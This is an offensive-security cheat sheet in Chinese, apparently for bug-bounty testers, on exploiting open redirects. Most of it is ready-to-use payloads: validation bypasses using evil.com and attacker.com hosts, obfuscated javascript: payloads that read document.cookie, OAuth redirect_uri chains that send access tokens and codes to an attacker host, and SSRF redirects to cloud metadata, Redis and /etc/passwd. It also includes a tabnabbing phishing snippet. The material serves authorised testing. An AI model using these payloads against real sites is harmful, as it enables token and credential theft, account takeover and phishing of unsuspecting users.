# 开放重定向全手法（按校验方式选绕过）

**用法**：先找跳转参数（§1），再看它的校验逻辑属于哪一类（§3 的表），直接取对应 payload。
开放重定向本身危害有限，价值在**链式利用**——OAuth 盗 token（§5）、绕 Referer 校验（§6）、借跳转打 SSRF（§7）。

## 0. 判据速查

| 校验逻辑 | 绕过思路 | 去哪节 |
|---|---|---|
| 要求以 `/` 开头 | 协议相对 URL `//evil.com` | §3.1 |
| 要求字符串含 `trusted.com` | 把域名塞进 path/query/fragment | §3.2 |
| 要求以 `https://trusted.com` 开头 | userinfo `trusted.com@evil.com` | §3.3 |
| 要求以 `target.com` 结尾 | `evil.com/www.target.com` | §3.4 |
| 只允许相对路径 | 反斜杠 `/\evil.com` | §3.5 |
| 按域名白名单 | 子域接管 `*.trusted.com` | §3.6 |
| 校验与使用方**解析器不同** | 找差分 payload | §8 |

## 1. 找跳转参数位

**常见参数名**：

```
?url=        ?redirect=   ?next=      ?dest=       ?destination=
?redir=      ?return=     ?returnUrl= ?backUrl=    ?go=
?forward=    ?target=     ?out=       ?continue=   ?link=
?view=       ?to=         ?ref=       ?callback=   ?path=
?rurl=       ?u=          ?jump=      ?goto=      ?checkout_url=
```

**服务端汇点**：

```
HTTP 301/302 Location 头
PHP:    header("Location: $input")
Python: redirect(input)
Java:   response.sendRedirect(input)
Node:   res.redirect(input)
```

**前端汇点**（能升级成 XSS）：

```javascript
window.location = input
window.location.href = input
window.location.replace(input)
window.open(input)
document.location = input
```

## 2. 最小确认

```
https://trusted.com/redirect?url=https://evil.com
```

`Location` 头返回 `https://evil.com`，或页面跳到 evil.com → 确认。

**先确认汇点类型**：302 的 `Location` 写 `javascript:` 浏览器通常不执行，那只是开放跳转**不是 XSS**；只有 `location.href` / `<a href>` 这类前端汇点才会执行 JS。

## 3. 按校验方式选绕过

### 3.1 要求以 `/` 开头

```text
//evil.com                 ← 协议相对，浏览器继承当前页协议
/\evil.com                ← 反斜杠，多数浏览器归一成 /
/\/evil.com
/%2F%2Fevil.com           ← 编码
```

### 3.2 要求字符串含 `trusted.com`

```text
evil.com?trusted.com           ← 域名放 query
trusted.com.evil.com           ← 域名做子域
http://evil.com#@trusted.com   ← 域名放 fragment
http://evil.com?trusted.com
```

### 3.3 要求以 `https://trusted.com` 开头

```text
https://trusted.com@evil.com      ← userinfo：浏览器去 evil.com
https://trusted.com%2F@evil.com   ← 编码后 userinfo 是 target.com/
```

### 3.4 要求以 `target.com` 结尾

```text
http://evil.com/www.target.com    ← path 结尾是 target.com
http://evil.com?target.com
```

Django 的 `endswith('target.com')` 就吃这个。

### 3.5 只允许相对路径

```text
/\evil.com
/\/evil.com
```

多数浏览器把 `\` 归一成 `/`，校验函数若把 `\` 当普通路径字符就放行。

### 3.6 域名白名单 + 子域接管

白名单按后缀匹配（`*.trusted.com`）时，先看有没有可接管的子域。**子域接管本身就是独立漏洞**，这条只是把它的价值接过来。

### 3.7 特殊字符混淆

```text
http://evil.com%00@trusted.com     ← null 字节截断
https://attacker.com%E3%80%82target.com   ← U+3002 表意句号，部分解析器当点
https://attacker。com              ← 全角句号 U+3002
https://attacker．com              ← 全角点 U+FF0E
```

### 3.8 CRLF 注入 + 跳转

```text
/%0d%0aLocation:%20https://attacker.com
```

服务端把 path 回显进响应头时，注入的 `Location` 会覆盖原来的：

```
HTTP/1.1 302 Found
Location: /
Location: https://attacker.com     ← 后写的赢
```

### 3.9 前端汇点：拆开 `javascript:`

字面 `javascript:` 被拦时，用控制字符拆开关键字：

```text
java%09script:alert(1)          ← tab
java%0dscript:alert(1)          ← CR
java%0ascript:alert(1)          ← LF
```

**关键字被拦时用反引号拼接**（`+` 要写成 `%2b`）：

```text
java%0dscript:window[`ev`%2b`al`](window[`at`%2b`ob`](`ZG9jdW1lbnQud3JpdGUoYWxlcnQoMSkp`))
java%0dscript:window[`ale`%2b`rt`](1)
```

`ev+al` / `at+ob` / `ale+rt` 拼出 `eval` / `atob`。先用 `alert(1)` 探协议通不通，证明危害时换 `document.write(document.cookie)` 或它的 base64。

## 4. 钓鱼放大

```
https://bigbank.com/redirect?url=https://bigbank-login.evil.com
```

受害者看到链接里是 `bigbank.com` → 点进去 → 在克隆站输密码。

这条本身不产生技术危害，但在 SRC 里是**有效漏洞**（用户可感知的信任滥用），评级按平台规则走。

## 5. OAuth / OIDC 盗 token

这是开放重定向最值钱的链。前提：`redirect_uri` 允许跳到一个**本身存在开放重定向**的端点。

### 5.1 隐式流（token 在 fragment）

```text
/authorize?response_type=token
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback/../redirect?url=https://evil.com
  &scope=read
```

流程：

1. 用户认证后，授权服务器跳到 `https://target.com/redirect?url=https://evil.com#access_token=SECRET`；
2. 开放重定向触发，浏览器跳到 `https://evil.com#access_token=SECRET`；
3. 攻击者页读 `location.hash` 拿到 token。

**关键**：fragment 不发给服务器，所以只能靠前端读——攻击者页面必须能跑 JS。

### 5.2 授权码流（code 在 query）

```text
/authorize?response_type=code
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback%2f..%2fredirect%3furl%3dhttps://evil.com
```

流程：

1. 授权服务器校验 `redirect_uri` 前缀匹配 `https://target.com/` → 通过；
2. 跳到 `https://target.com/redirect?url=https://evil.com&code=AUTH_CODE`；
3. 开放重定向把 code 带到 evil.com；
4. 攻击者用 code 换 access token。

### 5.3 OIDC id_token 泄露

`response_type=id_token` 时 id_token 在 fragment。攻击者拿到的是一个**已签名的身份断言**，可以在任何信任该 IdP 的 RP 上冒充受害者。

### 5.4 redirect_uri 校验绕过形态

```text
redirect_uri=https://target.com/callback/../open-redirect?url=evil.com
redirect_uri=https://target.com/callback?next=https://evil.com
redirect_uri=https://target.com/callback%23@evil.com
redirect_uri=https://target.com/callback/../../redirect
redirect_uri=https://target.com/callback#@evil.com
```

**先测哪条**：授权服务器对 `redirect_uri` 的校验一般是「前缀匹配」或「完全匹配」。完全匹配时上面全废；前缀匹配时 `../` 和 `?next=` 两条最容易通。

## 6. 绕 CSRF 的 Referer 校验

有些 CSRF 防护检查 `Referer` 是否含可信域：

1. 攻击者页面链接到 `https://trusted.com/redirect?url=https://trusted.com/change-email`；
2. 跳转过程中 `Referer` 保持 `trusted.com`；
3. CSRF 校验通过。

**判据**：目标站有「只校验 Referer 域名」的 CSRF 防护，且存在开放重定向。

## 7. 借跳转打 SSRF

### 7.1 服务端跟随跳转

服务端有 URL 预览、链接展开、webhook、图片抓取这类功能时：

1. 提交 `http://attacker.com/redirect`；
2. attacker.com 回 `302 Location: http://169.254.169.254/latest/meta-data/`；
3. 服务端跟随 → 打到云元数据；
4. IAM 凭据回显在预览里或直接返回给攻击者。

### 7.2 多跳绕过滤

1. 服务端直接拦 `169.254.169.254`；
2. 提交 `http://attacker.com/r1`；
3. `r1 → 302 → http://attacker.com/r2`（同域，过过滤）；
4. `r2 → 302 → http://169.254.169.254/`（内网，过滤不再复查）。

### 7.3 DNS 重绑定变体

1. attacker.com 解析到公网 IP（TTL=0）；
2. 服务端解析 → 公网 IP → 过 SSRF 过滤；
3. 连接建立后，HTTP 重定向又指向 attacker.com；
4. 第二次 DNS 解析 → 169.254.169.254；
5. 服务端跟到内网。

### 7.4 跨协议跳转扩大打击面

```text
http://attacker.com/redirect → gopher://127.0.0.1:6379/...   # Redis
http://attacker.com/redirect → file:///etc/passwd             # 本地文件
http://attacker.com/redirect → dict://127.0.0.1:11211/        # Memcached
```

不是所有 HTTP 客户端都跟跨协议跳转，但 `curl` 默认跟，部分库也跟。

## 8. 解析器差分（最好用的一类）

校验函数和最终使用方**不是同一个解析器**时，找两者行为不一致的输入。这是绕过开放重定向最通用的思路。

| Payload | 校验器看到的 | 浏览器实际去的 |
|---|---|---|
| `//evil.com` | 相对路径 | `https://evil.com` |
| `\/\/evil.com` | 路径 `\/\/evil.com` | `https://evil.com` |
| `//evil.com\@target.com` | 含 `target.com` | `https://evil.com` |
| `//target.com@evil.com` | 以 `target.com` 开头 | `https://evil.com` |
| `/%0d%0aLocation: https://evil.com` | 路径字符串 | 头注入 → 跳转 |
| `//evil%252ecom` | `evil%2ecom`（不是域名） | `evil.com`（二次解码后） |
| `https://target.com#@evil.com` | 含 `target.com` | `target.com`（fragment 不参与导航） |
| `https://attacker.com#.target.com` | 含 `target.com` | `attacker.com` |

**怎么找差分**：把校验逻辑和实际跳转当成两个黑盒，喂同一批畸形 URL，看两边判断是否分歧。上面的表就是常见分歧点的清单。

## 9. 反 tabnabbing

**判据**：站内链接用 `target="_blank"` 但没有 `rel="noopener"`。

```html
<!-- 有洞 -->
<a href="https://external.com" target="_blank">点这里</a>

<!-- 安全 -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">点这里</a>
```

攻击者页（被 `_blank` 打开的）执行：

```javascript
if (window.opener) {
    window.opener.location = "https://phishing.com/fake-login.html";
}
```

用户切回原标签页，看到的是假登录页。

**找点**：论坛/评论/个人简介里用户可控的链接、指向外部域的 `_blank` 链接、PDF 预览/文档预览在新标签打开的地方。

## 10. 检测清单

```
□ 列出所有会触发跳转的 URL 参数
□ 外部域：?url=https://evil.com
□ 协议相对：?url=//evil.com
□ userinfo：?url=https://trusted.com@evil.com
□ 反斜杠：?url=/\evil.com
□ 前端汇点：?url=javascript:alert(1) / javascript%3Adocument.write(document.cookie)
   （字面 javascript: 被拦时冒号改 %3A；证明用 document.write(document.cookie) 而不是 alert(1)）
□ 查 OAuth 流程里 redirect_uri 是否可绕到开放重定向端点
□ 确认跳转是否会把 token/code 带在 URL 上
□ 服务端有 URL 抓取功能时，测经跳转打 SSRF
□ 站内 _blank 链接是否缺 rel=noopener
```

## 11. 纪律

- **先分清汇点类型再谈危害**。302 的 `Location: javascript:` 不是 XSS，报成 XSS 会被打回。
- **开放重定向单点通常低危**，价值在链上。报之前想清楚：能盗 token 吗？能绕 CSRF 吗？能打 SSRF 吗？
- **校验方式是唯一的选路依据**。别把 §3 的 payload 全试一遍——看清代码/行为属于哪一类，一击即中。
- **`redirect_uri` 完全匹配时上面的 OAuth 链全部失效**，别硬试。
